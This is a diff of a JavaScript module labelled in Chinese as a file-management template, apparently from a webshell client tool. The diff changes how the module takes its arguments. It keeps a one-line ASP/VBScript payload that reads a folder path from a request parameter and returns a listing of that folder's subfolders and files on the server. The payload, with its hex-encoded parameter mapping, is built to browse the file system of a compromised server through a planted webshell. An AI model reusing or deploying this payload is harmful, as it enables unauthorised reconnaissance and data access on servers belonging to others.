@@ -1,10 +1,8 @@
-// 
-// 文件管理模板
-// 
+/**
+ * 文件管理模板
+ */
 
-import { arg1, arg2, arg3 } from './argv';
-
-module.exports = {
+module.exports = (arg1, arg2, arg3) => ({
   dir: {
     _:
       `Dim RR:RR=bd(Request("${arg1}")):Function FD(dt):FD=Year(dt)&"-":If Len(Month(dt))=1 Then:FD = FD&"0":End If:FD=FD&Month(dt)&"-":If Len(Day(dt))=1 Then:FD=FD&"0":End If:FD=FD&Day(dt)&" "&FormatDateTime(dt,4)&":":If Len(Second(dt))=1 Then:FD=FD&"0":End If:FD=FD&Second(dt):End Function:SET C=CreateObject("Scripting.FileSystemObject"):Set FO=C.GetFolder(""&RR&""):If Err Then:Response.Write("ERROR:// "&Err.Description):Err.Clear:Else:For Each F in FO.subfolders:Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10):Next:For Each L in FO.files:Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10):Next:End If`,
@@ -77,4 +75,4 @@ module.exports = {
     [arg1]: "#{hex::url}",
     [arg2]: "#{hex::path}"
   }
-}
+})
